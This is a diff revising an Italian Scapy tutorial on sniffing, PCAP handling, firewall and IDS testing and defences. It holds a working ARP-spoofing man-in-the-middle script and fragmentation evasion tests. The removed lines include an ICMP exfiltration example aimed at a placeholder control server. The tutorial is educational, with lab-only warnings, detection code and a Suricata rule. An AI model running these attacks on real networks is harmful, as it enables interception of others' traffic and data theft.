+Si manda una richiesta "chi ha questo IP?" in broadcast. Chi risponde è vivo, e ci dà anche il MAC.
 
-**Catturare mentre fai altro.** `sniff()` blocca lo script finché non finisce la cattura — un problema quando, per esempio, devi avviare uno sniffer e continuare con un ARP spoofing nello stesso script. `AsyncSniffer` risolve questo, catturando in background:
+***
+
+## Scapy sniff: packet sniffer con Scapy
+
+Lo sniffing con Scapy si fa con la funzione `sniff()`. Cattura i pacchetti dalla scheda di rete e passa ognuno a una tua funzione.
 
 ```python
-from scapy.all import AsyncSniffer
+from scapy.all import sniff
 
-sniffer = AsyncSniffer(filter="tcp", prn=analizza, store=False)
-sniffer.start()
-# ...qui il resto dello script continua, es. l'ARP spoofing
-sniffer.stop()
+def show_packet(packet):
+    print(packet.summary())
+
+sniff(iface="eth0", prn=show_packet, count=10)
 ```
 
-> `sniff()` tiene tutti i pacchetti catturati in memoria per default. Su catture lunghe imposta `store=False` (come negli esempi sopra) o la RAM si esaurisce.
+Un packet sniffer in Python (uno sniffer Python) con Scapy in dieci righe. I parametri che contano:
 
-**Salvare e riaprire una cattura (PCAP).** Per un report di pentest, o per rianalizzare con calma quello che hai catturato, salva tutto in un file `.pcap` — lo stesso formato che apre Wireshark:
+| Parametro | Significato                                                |
+| --------- | ---------------------------------------------------------- |
+| `iface`   | La scheda di rete da ascoltare                             |
+| `prn`     | La funzione da chiamare per ogni pacchetto                 |
+| `count`   | Dopo quanti pacchetti fermarsi (0 = mai)                   |
+| `timeout` | Dopo quanti secondi fermarsi                               |
+| `filter`  | Un filtro BPF, applicato dal kernel (veloce)               |
+| `lfilter` | Un filtro Python, applicato da Scapy (lento ma flessibile) |
+| `store`   | `False` per non tenere i pacchetti in memoria              |
+| `offline` | Legge da un file PCAP invece che dalla rete                |
+
+Metti `store=False` quando lo sniffer gira a lungo, altrimenti la memoria si riempie.
+
+### Scapy sniff con filtri BPF
+
+Il filtro BPF (Berkeley Packet Filter) è lo stesso linguaggio di [tcpdump](https://hackita.it/articoli/tcpdump/). Il filtro lavora dentro il kernel e scarta i pacchetti prima che arrivino a Python.
+
+| Filtro BPF                            | Cosa cattura                |
+| ------------------------------------- | --------------------------- |
+| `tcp`                                 | Solo TCP                    |
+| `udp port 53`                         | Solo DNS                    |
+| `host 192.168.56.101`                 | Traffico da e verso un host |
+| `src host 192.168.56.101`             | Solo dal host               |
+| `tcp port 80 or tcp port 8080`        | Web non cifrato             |
+| `icmp`                                | Solo ping                   |
+| `arp`                                 | Solo ARP                    |
+| `net 192.168.56.0/24 and not port 22` | Una rete, escluso SSH       |
+| `tcp[tcpflags] & tcp-syn != 0`        | Solo pacchetti con SYN      |
 
 ```python
-from scapy.all import wrpcap, rdpcap
+from scapy.all import sniff
 
-wrpcap("cattura.pcap", pacchetti_catturati)   # salva una lista di pacchetti
-pacchetti = rdpcap("cattura.pcap")            # ricarica per analisi offline
+sniff(iface="eth0", filter="tcp port 80", prn=lambda p: p.summary(), count=20)
 ```
 
-Un flusso tipico in un pentest reale è proprio questo: costruisci o catturi con Scapy, salvi in PCAP, e apri il file in Wireshark per un'analisi visiva più comoda — i due strumenti non si escludono, si completano.
+Il filtro BPF richiede libpcap (su Kali c'è già, su Windows lo porta Npcap). Se manca, Scapy ti dà l'errore `libpcap is not available`. In quel caso usa `lfilter`, che funziona sempre.
 
-## ARP Spoofing e MITM con Scapy
+### Sniffer HTTP e DNS con Scapy
 
-L'ARP spoofing sfrutta il fatto che il protocollo ARP non verifica identità: basta rispondere "sono io" più spesso della macchina legittima perché la vittima ti creda. Usa questa tecnica solo su reti che gestisci o in un engagement autorizzato — su reti locali reali il traffico di terzi può includere dati personali non in scope.
+**Sniffer HTTP:** mostra la prima riga delle richieste web in chiaro.
 
 ```python
-from scapy.all import ARP, send
+from scapy.all import sniff, TCP, Raw
+
+def show_http_request(packet):
+    if Raw in packet:
+        first_line = packet[Raw].load.split(b"\r\n")[0]
+        if first_line.startswith((b"GET ", b"POST ", b"PUT ")):
+            print(packet["IP"].src, "->", packet["IP"].dst, first_line.decode(errors="replace"))
+
+sniff(iface="eth0", filter="tcp port 80", prn=show_http_request, store=False)
+```
+
+Vede solo HTTP in chiaro. Il traffico HTTPS è cifrato: vedi gli indirizzi e le dimensioni, non il contenuto.
+
+**Sniffer DNS:** mostra chi chiede quale nome.
+
+```python
+from scapy.all import sniff, DNS, DNSQR, IP
+
+def show_dns_query(packet):
+    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
+        print(packet[IP].src, packet[DNSQR].qname.decode())
+
+sniff(iface="eth0", filter="udp port 53", prn=show_dns_query, store=False)
+```
+
+### Sniffing in background con AsyncSniffer
+
+Se devi sniffare e fare altro nello stesso script, usa `AsyncSniffer`: parte in background e lo fermi quando vuoi.
+
+```python
 import time
+from scapy.all import AsyncSniffer, IP, ICMP, send
 
-def spoof(ip_target, ip_da_impersonare):
-    pacchetto = ARP(op=2, pdst=ip_target, psrc=ip_da_impersonare)
-    send(pacchetto, verbose=False)
-
-while True:
-    spoof("192.168.1.20", "192.168.1.1")   # dico alla vittima che il gateway sono io
-    spoof("192.168.1.1", "192.168.1.20")   # dico al gateway che la vittima sono io
-    time.sleep(2)
+sniffer = AsyncSniffer(iface="eth0", filter="icmp")
+sniffer.start()
+time.sleep(1)
+send(IP(dst="192.168.56.101") / ICMP(), verbose=0)
+time.sleep(2)
+captured = sniffer.stop()
+print(len(captured), "packets")
 ```
 
-Un dettaglio che separa un attacco funzionante da un disastro: **senza IP forwarding attivo sulla tua macchina, il traffico che intercetti non arriva mai a destinazione**. Hai fatto un MITM parziale che, di fatto, è un denial of service verso la vittima, non un'intercettazione:
+***
+
+## File PCAP con Scapy: leggere, scrivere e analizzare
+
+I file PCAP sono il formato di cattura che usano tcpdump e [Wireshark](https://hackita.it/articoli/wireshark/). Con Scapy li scrivi e li leggi in una riga.
+
+```python
+from scapy.all import sniff, wrpcap, rdpcap, TCP
+
+# Capture 100 packets and save them
+packets = sniff(iface="eth0", count=100)
+wrpcap("capture.pcap", packets)
+
+# Read a capture back
+packets = rdpcap("capture.pcap")
+print(len(packets), "packets")
+packets[0].show()
+
+# Filter the capture in Python
+syn_packets = [p for p in packets if TCP in p and p[TCP].flags == "S"]
+print(len(syn_packets), "SYN packets")
+```
+
+Per file grandi, `rdpcap()` carica tutto in memoria. Meglio leggere un pacchetto alla volta:
+
+```python
+from scapy.all import PcapReader
+
+with PcapReader("capture.pcap") as reader:
+    for packet in reader:
+        print(packet.summary())
+```
+
+Con `sniff(offline="capture.pcap", prn=...)` rilanci su una cattura la stessa funzione che usi dal vivo. Dopo, apri il file in Wireshark per guardarlo bene. Se hai [TShark](https://hackita.it/articoli/tshark/) puoi fare riassunti veloci dal terminale.
+
+Una cosa da sapere: se catturi su `lo` (loopback) ogni pacchetto compare due volte, perché Linux lo mostra in uscita e in entrata.
+
+***
+
+## ARP spoofing e MITM con Scapy in laboratorio
+
+L'ARP spoofing sfrutta un difetto di ARP: nessuno controlla chi risponde. Un attaccante dice alla vittima "il gateway sono io" e al gateway "la vittima sono io". Da lì tutto il traffico passa da lui. Il risultato è un [Man in the Middle](https://hackita.it/articoli/man-in-the-middle/).
+
+Usalo **solo in un laboratorio tuo** (due macchine virtuali in una rete host-only, per esempio). Su una rete altrui è illegale, e un errore può togliere la rete a tutti.
+
+Prima abiliti il forwarding, così la vittima continua a navigare:
 
 ```bash
 echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 ```
 
-Solo con il forwarding attivo il traffico passa davvero da te e arriva comunque al gateway — a quel punto lo script di sniffing della sezione precedente, puntato sull'interfaccia giusta, può leggere quello che la vittima manda in chiaro. È lo stesso principio che rende pericoloso un protocollo come TFTP, che non cifra nulla: intercettato il traffico, i dati passano in chiaro davanti a te.
-
-## Un accenno a DNS ed esfiltrazione via ICMP
-
-In un ambiente dove il traffico TCP in uscita è bloccato ma ICMP o DNS passano comunque (capita spesso nei test su reti aziendali segmentate), un canale come questo diventa interessante da conoscere lato difensivo prima ancora che offensivo:
+Poi lo script. Gli IP sono quelli di una rete host-only tipica: vittima `192.168.56.101`, gateway `192.168.56.1`.
 
 ```python
-from scapy.all import IP, ICMP, Raw, send
+import time
+from scapy.all import ARP, Ether, getmacbyip, sendp
 
-send(IP(dst="server-di-controllo") / ICMP() / Raw(load="dato da esfiltrare"))
+VICTIM_IP = "192.168.56.101"
+GATEWAY_IP = "192.168.56.1"
+IFACE = "eth1"
+
+victim_mac = getmacbyip(VICTIM_IP)
+gateway_mac = getmacbyip(GATEWAY_IP)
+
+if victim_mac is None or gateway_mac is None:
+    raise SystemExit("cannot resolve MAC addresses, check IFACE and the lab network")
+
+
+def poison():
+    # Tell the victim that the gateway IP is at our MAC
+    sendp(Ether(dst=victim_mac) / ARP(op=2, psrc=GATEWAY_IP, pdst=VICTIM_IP, hwdst=victim_mac), iface=IFACE, verbose=0)
+    # Tell the gateway that the victim IP is at our MAC
+    sendp(Ether(dst=gateway_mac) / ARP(op=2, psrc=VICTIM_IP, pdst=GATEWAY_IP, hwdst=gateway_mac), iface=IFACE, verbose=0)
+
+
+def restore():
+    # Send the real MAC addresses back, several times to be sure
+    sendp(Ether(dst=victim_mac) / ARP(op=2, psrc=GATEWAY_IP, hwsrc=gateway_mac, pdst=VICTIM_IP, hwdst=victim_mac), iface=IFACE, count=5, verbose=0)
+    sendp(Ether(dst=gateway_mac) / ARP(op=2, psrc=VICTIM_IP, hwsrc=victim_mac, pdst=GATEWAY_IP, hwdst=gateway_mac), iface=IFACE, count=5, verbose=0)
+
+
+try:
+    while True:
+        poison()
+        time.sleep(2)
+except KeyboardInterrupt:
+    restore()
+    print("ARP tables restored")
 ```
 
-Un pacchetto ICMP con dati nel payload sembra un ping qualunque a un controllo superficiale. Lo stesso principio vale per query DNS costruite con il dato nascosto nel nome host (`dato.dominio-attaccante.com`). Conoscerlo serve soprattutto a un blue team: un IDS che ispeziona solo intestazioni e non il contenuto dei pacchetti ICMP/DNS non vede nulla di anomalo, ed è per questo che i sistemi di detection maturi (Suricata, Zeek) controllano anche dimensione e frequenza di questi pacchetti, non solo il protocollo.
+Cosa succede: `op=2` è una risposta ARP (is-at) mandata senza che nessuno l'abbia chiesta. Il campo `hwsrc` non lo scrivi, quindi Scapy usa il MAC della tua scheda: è quello che fa l'inganno. Ripeti ogni due secondi perché le voci ARP scadono.
 
-## Dove Entra Scapy in un Pentest Vero
-
-Nessun pentester si sveglia pensando "oggi faccio ARP spoofing con Scapy" come attività isolata. Scapy entra in un flusso più ampio, di solito così:
-
-1. **Nmap o un altro scanner** trova un servizio o un comportamento che non torna — una porta che risponde in modo strano, un protocollo poco comune, un firewall che sembra bloccare in modo incoerente
-2. **Scapy costruisce il pacchetto specifico** per verificare quell'ipotesi — un flag particolare, un frammento, un protocollo che gli scanner generici non testano a fondo
-3. **Wireshark (o una cattura PCAP)** conferma cosa è successo davvero sul filo, pacchetto per pacchetto
-4. il risultato diventa parte del **report**: non "ho provato l'evasione", ma "il firewall X non ispeziona i frammenti oltre il primo, prova ne è il pacchetto Y che ha raggiunto il servizio Z"
-
-Scapy, in questo flusso, non è mai lo strumento principale dall'inizio alla fine: è il modo per rispondere a una domanda precisa quando lo strumento generico non basta più.
-
-## Funzioni Principali di Scapy
-
-| Funzione                       | Utilizzo                                                   |
-| ------------------------------ | ---------------------------------------------------------- |
-| `send()`                       | Invio a livello 3 (IP), senza attesa risposta              |
-| `sendp()`                      | Invio a livello 2 (Ethernet), senza attesa risposta        |
-| `sr()`                         | Invio (livello 3) + raccolta di tutte le risposte          |
-| `sr1()`                        | Invio + attesa di una sola risposta                        |
-| `srp()`                        | Come `sr()` ma a livello 2 — tipico per host discovery ARP |
-| `sniff()`                      | Cattura pacchetti con filtro BPF                           |
-| `AsyncSniffer()`               | Cattura in background, non bloccante                       |
-| `ls()`                         | Elenca i campi disponibili di un protocollo                |
-| `show()`                       | Mostra la struttura di un pacchetto                        |
-| `show2()`                      | Come `show()`, ma forza il calcolo dei campi automatici    |
-| `summary()`                    | Riepilogo di un pacchetto su una riga                      |
-| `hexdump()`                    | Dump esadecimale del pacchetto                             |
-| `wrpcap()`                     | Salva una cattura in formato PCAP                          |
-| `rdpcap()`                     | Rilegge un file PCAP                                       |
-| `get_if_list()` / `conf.iface` | Elenca/mostra le interfacce di rete disponibili            |
-
-## I Limiti Reali di Scapy (e Quando Non È lo Strumento Giusto)
-
-* **Ha un overhead non trascurabile su volumi alti.** Per una scansione di 65.000 porte non usi Scapy: usi Nmap o masscan, pensati per quello. Scapy costruisce ogni pacchetto in Python e non sfrutta di norma accelerazioni a livello kernel (tecniche come PF\_RING, AF\_PACKET o DPDK, usate da strumenti pensati per il volume) — su uno scan massivo l'overhead diventa evidente.
-* **Non è invisibile.** I pacchetti generati hanno timing e caratteristiche riconoscibili; un IDS maturo come Suricata o Snort con regole aggiornate li individua senza troppa difficoltà. Scapy aiuta a *capire* l'evasione, non la garantisce.
-* **Non è un C2.** Gli esempi di canali coperti visti sopra sono didattici: un command & control vero (Cobalt Strike, Sliver, o anche un semplice framework su misura) gestisce cifratura, jitter, resilienza alla perdita di pacchetti — cose che uno script Scapy fatto in mezz'ora non replica.
-* **Non tutti gli stack di rete si comportano uguale.** Un pacchetto costruito "a norma" da Scapy può comunque essere interpretato in modo diverso da stack TCP/IP diversi (Linux, Windows, dispositivi embedded), e alcune schede di rete calcolano da sole i checksum (offload), rendendo `show()` fuorviante finché non forzi il calcolo con `show2()` come visto sopra.
-
-Sapere quando **non** usare uno strumento è parte della competenza tanto quanto sapere come usarlo.
-
-## Errori Comuni di Chi Inizia con Scapy
-
-* **`sr1()` senza `timeout`**: lo script resta bloccato se il target non risponde
-* **Dimenticare `Ether()`/`sendp()` quando serve controllo di livello 2**, per poi chiedersi perché `send()` non funziona su un attacco ARP
-* **ARP spoofing senza attivare l'IP forwarding**: da MITM a DoS accidentale in un secondo
-* **Non impostare `store=False` in `sniff()` su catture lunghe**: la RAM si esaurisce
-* **Guardare `show()` prima dell'invio e pensare che il checksum sia sbagliato**: alcuni campi si calcolano solo al momento della trasmissione — usa `show2()` per vederli già valorizzati
-
-## Troubleshooting
-
-| Problema                                              | Causa probabile                                                                |
-| ----------------------------------------------------- | ------------------------------------------------------------------------------ |
-| Nessuna risposta al pacchetto inviato                 | Firewall, routing sbagliato, o servizio down                                   |
-| Il pacchetto sembra uscire dall'interfaccia sbagliata | VPN/Wi-Fi/Ethernet multipli — controlla `conf.iface`/`conf.route`              |
-| `Permission denied` sull'invio                        | Privilegi insufficienti — servono root/amministratore                          |
-| Checksum apparentemente errato in `show()`            | Campo calcolato solo all'invio — usa `show2()`                                 |
-| `sendp()`/ARP che non funziona                        | Manca `Ether()`, o interfaccia sbagliata                                       |
-| SYN scan con risultati incoerenti                     | Il kernel locale genera RST autonomamente — vedi la nota nella sezione TCP SYN |
-| `sniff()` non cattura nulla                           | Filtro BPF sbagliato o interfaccia sbagliata                                   |
-
-## È Legale?
-
-Costruire e inviare pacchetti — anche "anomali" come quelli visti qui — su una rete o un sistema di cui hai il permesso esplicito (un tuo laboratorio, una macchina HackTheBox o VulnLab, un ambiente di test autorizzato da un cliente) è normale attività di apprendimento e di pentest. Farlo su reti o sistemi altrui senza autorizzazione rientra nell'accesso abusivo a sistema informatico previsto dall'art. 615-ter del codice penale italiano — un motivo in più per tenere questi esperimenti dentro un lab, non su reti che non gestisci.
-
-## Domande Frequenti
-
-**Cos'è Scapy in Python?**
-Una libreria per il packet crafting: costruzione, invio, cattura e analisi di pacchetti di rete campo per campo, a livello Ethernet, IP, TCP, UDP, ICMP e altri protocolli.
-
-**A cosa serve Scapy?**
-A network security, penetration testing, troubleshooting di rete e ricerca sui protocolli — ovunque serva costruire o analizzare un pacchetto a un livello di dettaglio che i tool standard non offrono.
-
-**Come si installa Scapy?**
-`pip install scapy`, oppure su Kali/Debian `sudo apt install python3-scapy`.
-
-**Serve essere root per usare Scapy?**
-La maggior parte delle operazioni di invio, sniffing e accesso a raw socket richiede privilegi elevati (root su Linux, amministratore su Windows) — non è un requisito assoluto per ogni singola funzione della libreria, ma lo è per quasi tutto ciò che tocca la rete direttamente.
-
-**Scapy funziona su Windows?**
-Sì, ma serve installare il driver Npcap e alcune funzionalità a livello 2 possono comportarsi diversamente rispetto a Linux, specialmente su interfacce Wi-Fi.
-
-**Scapy può sostituire Nmap?**
-No, per uno scan quotidiano Nmap resta più veloce e più maturo. Scapy serve a capire come funzionano quelle tecniche, o a costruire pacchetti che Nmap non prevede.
-
-**Qual è la differenza tra `send()` e `sendp()`?**
-`send()` lavora a livello 3 (IP) e lascia che sia il sistema a occuparsi dell'incapsulamento Ethernet; `sendp()` lavora a livello 2 e richiede che tu costruisca esplicitamente il frame Ethernet.
-
-**Qual è la differenza tra `sr()`, `sr1()` e `srp()`?**
-`sr1()` invia e aspetta una singola risposta; `sr()` invia (anche più pacchetti insieme) e restituisce tutte le coppie richiesta/risposta ricevute a livello 3; `srp()` fa lo stesso a livello 2, tipicamente usata per host discovery ARP su una subnet.
-
-**Come si fa un host discovery con Scapy?**
-Con `srp()` e un pacchetto ARP broadcast verso l'intera subnet — vedi l'esempio nella sezione su `srp()` sopra.
-
-**Scapy è lento?**
-Rispetto a strumenti ottimizzati per il volume come Nmap o masscan, sì: costruisce ogni pacchetto in Python. Per pochi pacchetti mirati la differenza è irrilevante; su scansioni di migliaia di porte si sente.
-
-**Scapy supporta IPv6?**
-Sì, inclusi ICMPv6 e Neighbor Discovery, con la stessa logica a livelli vista per IPv4.
-
-**Un IDS moderno rileva il traffico generato da Scapy?**
-Nella maggior parte dei casi sì, se le regole sono aggiornate. Scapy è uno strumento per imparare ed esplorare l'evasione, non una garanzia di invisibilità in un ambiente monitorato bene.
-
-**Scapy è legale da usare?**
-Costruire e inviare pacchetti su una rete o un sistema di cui hai il permesso esplicito (lab, HTB, VulnLab, un engagement autorizzato) è normale attività di studio e pentest. Su reti che non gestisci senza autorizzazione, no — vedi la sezione legale sopra.
+Per vedere l'effetto sulla vittima: `ip neigh` (Linux) o `arp -a` (Windows). Il MAC del gateway diventa il tuo. Mentre il MITM è attivo, in un'altra finestra puoi usare lo sniffer HTTP visto sopra. Altri strumenti per questo attacco e le sue varianti sono in [Man in the Middle](https://hackita.it/articoli/man-in-the-middle/).
 
 ***
 
-## Per approfondire
+## Scapy per testare firewall e IDS
 
-* [Scapy — documentazione ufficiale](https://scapy.readthedocs.io/) — riferimento completo di protocolli e funzioni disponibili
-* La nostra guida alla porta 2375 di Docker mostra un altro caso in cui capire davvero cosa gira "sotto" un protocollo fa la differenza tra uno scan superficiale e una scoperta reale
+Scapy è utile per capire come reagisce una difesa a pacchetti fuori dal normale. Ogni test è un campo cambiato.
+
+| Test                  | Pacchetto                          | Cosa verifichi                                         |
+| --------------------- | ---------------------------------- | ------------------------------------------------------ |
+| Flag anomali          | `TCP(flags="FPU")` (Xmas)          | Se il firewall e l'IDS vedono scansioni "silenziose"   |
+| TTL basso             | `IP(ttl=1)`                        | Se un router risponde con ICMP tipo 11                 |
+| Frammentazione        | `fragment(pacchetto, fragsize=24)` | Se l'IDS ricostruisce i frammenti prima di analizzarli |
+| Porta sorgente fissa  | `TCP(sport=53, dport=80)`          | Se il firewall si fida del traffico che "sembra" DNS   |
+| Pacchetti senza stato | ACK senza SYN                      | Se il firewall è stateful                              |
+
+Esempio con frammentazione:
+
+```python
+from scapy.all import IP, ICMP, Raw, fragment, send
+
+fragments = fragment(IP(dst="192.168.56.101") / ICMP() / Raw(b"A" * 64), fragsize=24)
+print(len(fragments), "fragments")
+send(fragments, verbose=0)
+```
+
+Se la tua scansione compare nei log dell'IDS, sai già cosa rileva. Se non compare, hai trovato un buco da segnalare nel report.
 
 ***
 
-*Articolo a scopo didattico. Tecniche testate su ambienti autorizzati come HackTheBox, VulnLab e lab personali.*
+## Comandi Scapy ed esempi: cheat sheet
+
+| Cosa vuoi fare                  | Comando                                                                      |
+| ------------------------------- | ---------------------------------------------------------------------------- |
+| Avviare la shell                | `sudo scapy`                                                                 |
+| Vedere i campi di un protocollo | `ls(TCP)`                                                                    |
+| Ping                            | `sr1(IP(dst="192.168.56.101")/ICMP(), timeout=2)`                            |
+| SYN scan                        | `sr(IP(dst="192.168.56.101")/TCP(dport=[22,80,443], flags="S"), timeout=2)`  |
+| Scansione ARP                   | `srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.56.0/24"), timeout=2)` |
+| Sniffare 10 pacchetti           | `sniff(iface="eth0", count=10)`                                              |
+| Sniffare con filtro BPF         | `sniff(filter="tcp port 80", prn=lambda p: p.summary())`                     |
+| Salvare una cattura             | `wrpcap("capture.pcap", packets)`                                            |
+| Leggere una cattura             | `rdpcap("capture.pcap")`                                                     |
+| Aprire in Wireshark             | `wireshark(packets)`                                                         |
+| Traceroute                      | `traceroute("8.8.8.8")`                                                      |
+| Frammentare                     | `fragment(pacchetto, fragsize=24)`                                           |
+| Hexdump                         | `hexdump(pacchetto)`                                                         |
+| Costruire da byte               | `IP(raw_bytes)`                                                              |
+
+***
+
+## Errori comuni e troubleshooting
+
+| Problema                                 | Causa                                         | Soluzione                                                            |
+| ---------------------------------------- | --------------------------------------------- | -------------------------------------------------------------------- |
+| `Operation not permitted`                | Non sei root                                  | `sudo` (Linux, macOS) o terminale amministratore (Windows)           |
+| `sr1()` ritorna `None`                   | Host spento, firewall, o timeout troppo corto | Prova un ping normale, alza `timeout`                                |
+| `WARNING: No route found`                | Scapy non trova la strada verso l'IP          | Controlla `conf.route` e l'IP di destinazione                        |
+| `libpcap is not available`               | Manca libpcap, il filtro BPF non funziona     | Installa libpcap o tcpdump; oppure usa `lfilter`                     |
+| Sniffing vuoto su Windows                | Npcap non installato                          | Installa Npcap da nmap.org/npcap                                     |
+| Sniffer Wi-Fi vuoto                      | La scheda non è in monitor mode               | Metti la scheda in monitor mode e usa `monitor=True` dove supportato |
+| Ogni pacchetto compare due volte         | Stai sniffando `lo`                           | È normale: uscita e entrata                                          |
+| `externally-managed-environment` con pip | Python protetto dal sistema                   | Usa `venv` oppure `apt install python3-scapy`                        |
+| Lo scan è molto lento                    | Scapy è scritto in Python                     | Per scansioni grandi usa Nmap                                        |
+| La connessione si chiude dopo il SYN-ACK | Il kernel manda un RST                        | Regola iptables vista sopra                                          |
+| L'attacco ARP non funziona               | Switch con protezioni                         | Vedi Dynamic ARP Inspection nella parte difensiva                    |
+
+Per capire se un pacchetto è stato costruito bene, `show2()` calcola checksum e lunghezze come li calcolerebbe la rete, e confrontarlo con una cattura in Wireshark risolve quasi sempre il dubbio.
+
+***
+
+## Laboratorio locale con Scapy
+
+Questo laboratorio gira tutto su `127.0.0.1`: non tocca nessuna rete e puoi lanciarlo ovunque. Crea un piccolo server web, poi con Scapy fa un ping, una scansione SYN di quattro porte, sniffa la richiesta HTTP e salva la cattura in un PCAP.
+
+Salvalo come `lab_scapy.py` e avvialo con `sudo python3 lab_scapy.py`:
+
+```python
+#!/usr/bin/env python3
+# Local Scapy lab: everything stays on 127.0.0.1, run with sudo
+import threading
+import time
+import http.server
+import urllib.request
+from scapy.all import IP, TCP, ICMP, Raw, sr, sr1, AsyncSniffer, wrpcap, rdpcap, conf
+
+conf.verb = 0
+TARGET = "127.0.0.1"
+LAB_PORT = 8080
+
+
+class QuietHandler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"lab ok")
+
+    def log_message(self, *args):
+        pass
+
+
+server = http.server.ThreadingHTTPServer((TARGET, LAB_PORT), QuietHandler)
+threading.Thread(target=server.serve_forever, daemon=True).start()
+
+# 1) ICMP ping
+reply = sr1(IP(dst=TARGET) / ICMP(), timeout=2)
+print("ping:", "alive" if reply is not None and reply[ICMP].type == 0 else "no reply")
+
+# 2) SYN scan on a few ports
+ports = [22, 80, 8080, 8081]
+answered, _ = sr(IP(dst=TARGET) / TCP(dport=ports, flags="S"), timeout=2)
+for sent, received in sorted(answered, key=lambda pair: pair[0][TCP].dport):
+    state = "open" if received[TCP].flags == 0x12 else "closed"
+    print(f"scan: {sent[TCP].dport}/tcp {state}")
+
+# 3) sniff the HTTP request made by urllib
+captured = []
+sniffer = AsyncSniffer(
+    iface="lo",
+    lfilter=lambda p: TCP in p and p[TCP].dport == LAB_PORT and Raw in p,
+    prn=captured.append,
+    store=False,
+)
+sniffer.start()
+time.sleep(1)
+urllib.request.urlopen(f"http://{TARGET}:{LAB_PORT}/test").read()
+time.sleep(1)
+sniffer.stop()
+print("sniff:", captured[0][Raw].load.split(b"\r\n")[0].decode())
+
+# 4) save to pcap and read it back
+wrpcap("lab.pcap", captured)
+print("pcap packets:", len(rdpcap("lab.pcap")))
+server.shutdown()
+```
+
+Output atteso:
+
+```text
+ping: alive
+scan: 22/tcp closed
+scan: 80/tcp closed
+scan: 8080/tcp open
+scan: 8081/tcp closed
+sniff: GET /test HTTP/1.1
+pcap packets: 2
+```
+
+Le porte 22, 80 e 8081 sono chiuse perché non c'è nessun servizio. La 8080 è aperta perché ci sta il server del laboratorio. I pacchetti nel PCAP sono due perché su `lo` ogni pacchetto si vede in uscita e in entrata. Apri `lab.pcap` in Wireshark per vedere la richiesta con i tuoi occhi.
+
+***
+
+## Come difendersi dagli attacchi fatti con Scapy
+
+Scapy è solo uno strumento: le difese valgono contro qualunque programma che manda gli stessi pacchetti.
+
+**1. ARP spoofing: blocca la causa sullo switch.** Dynamic ARP Inspection controlla ogni risposta ARP contro la tabella del DHCP snooping e scarta quelle false.
+
+```text
+ip dhcp snooping
+ip dhcp snooping vlan 10
+ip arp inspection vlan 10
+
+interface GigabitEthernet1/0/24
+ ip dhcp snooping trust
+ ip arp inspection trust
+```
+
+Le porte verso gli utenti restano non fidate, quelle verso router e altri switch diventano fidate. In più, `port-security` limita quanti MAC può avere ogni porta, e le [VLAN](https://hackita.it/articoli/vlan/) separano chi non deve parlare. Sui server importanti puoi anche fissare il MAC del gateway a mano:
+
+```bash
+sudo ip neigh replace 192.168.56.1 lladdr 02:00:00:00:00:01 dev eth0 nud permanent
+```
+
+Cambia il MAC con quello vero del tuo gateway.
+
+**2. ARP spoofing: scoprilo con uno script.** Questo monitor ricorda quale MAC corrisponde a ogni IP e avvisa quando cambia. Funziona dal vivo o su un PCAP:
+
+```python
+from scapy.all import sniff, ARP
+
+known = {}
+
+
+def check_arp(packet):
+    if ARP in packet and packet[ARP].op == 2:
+        ip, mac = packet[ARP].psrc, packet[ARP].hwsrc
+        if ip in known and known[ip] != mac:
+            print(f"ALERT {ip} changed from {known[ip]} to {mac}")
+        known.setdefault(ip, mac)
+
+
+sniff(iface="eth0", filter="arp", prn=check_arp, store=False)
+```
+
+Provato su un PCAP con due risposte ARP per lo stesso IP e MAC diversi: stampa l'alert. In produzione usa `arpwatch`, che fa lo stesso lavoro e mantiene lo storico.
+
+**3. Scansioni di porte: regola per l'IDS.** Questa regola Suricata segnala chi manda molti SYN in pochi secondi:
+
+```text
+alert tcp any any -> $HOME_NET any (msg:"Possible SYN scan"; flags:S; threshold:type both, track by_src, count 30, seconds 5; sid:1000001; rev:1;)
+```
+
+**4. Pacchetti che sembrano di Scapy.** Un `TCP()` lasciato ai default ha porta sorgente 20, finestra 8192 e porta destinazione 80. Un SYN che arriva da porta 20 con finestra 8192 non è un client normale. Non è una prova (chi usa Scapy può cambiare tutto), ma è un buon segnale da guardare nei log del firewall o in una cattura.
+
+**5. Altre regole di base.**
+
+* Filtra in ingresso i pacchetti con TTL anomalo, flag impossibili (SYN+FIN, NULL, Xmas) e frammenti troppo piccoli.
+* Fai in modo che il firewall sia stateful: ACK e FIN senza una connessione prima devono essere scartati.
+* Fai ricomporre i frammenti all'IDS prima di analizzarli.
+* Usa 802.1X per tenere fuori dalla rete chi non è autorizzato: se la porta non si apre, nessuno può mandare un ARP.
+* Cifra il traffico (HTTPS, SSH, VPN): anche in caso di MITM l'attaccante vede solo dati cifrati.
+* Tieni un sensore con [tcpdump](https://hackita.it/articoli/tcpdump/) o [Wireshark](https://hackita.it/articoli/wireshark/) sulle reti sensibili per avere una cattura da analizzare dopo un incidente.
+
+Usa Scapy solo su reti e sistemi per cui hai un'autorizzazione scritta: mandare pacchetti falsificati senza permesso è reato in quasi tutti i Paesi.
+
+***
+
+## FAQ
+
+**Cos'è Scapy?** È una libreria Python per costruire, inviare, catturare e analizzare pacchetti di rete.
+
+**A cosa serve Scapy?** Serve per packet crafting, sniffing, scansioni, test di firewall e IDS, analisi di file PCAP e per studiare i protocolli di rete.
+
+**Come si installa Scapy?** Su Kali con `sudo apt install python3-scapy`, su Linux e macOS con `pip install scapy` (meglio dentro un ambiente virtuale). Su Windows installa prima Npcap, poi `pip install scapy`.
+
+**Scapy funziona su Windows?** Sì, ma serve Npcap per catturare e inviare pacchetti. Alcune funzioni di livello 2 sono più limitate che su Linux.
+
+**Come si usa Scapy in Python?** Importi la libreria con `from scapy.all import *`, costruisci un pacchetto unendo i protocolli con `/` e lo mandi con `send()`, `sr()` o `sr1()`.
+
+**Qual è la differenza tra send, sendp, sr e sr1?** `send` e `sendp` mandano e basta (livello 3 e livello 2). `sr` e `sr1` mandano e aspettano la risposta (tutte o solo la prima). `srp` e `srp1` fanno lo stesso al livello 2.
+
+**Come si fa uno sniffer di pacchetti con Scapy?** Con `sniff()`: indichi la scheda di rete (`iface`), un filtro BPF (`filter`) e una funzione da chiamare per ogni pacchetto (`prn`).
+
+**Posso usare filtri BPF in Scapy?** Sì, con il parametro `filter`. Serve libpcap. Se non c'è, usa `lfilter`, che accetta una funzione Python.
+
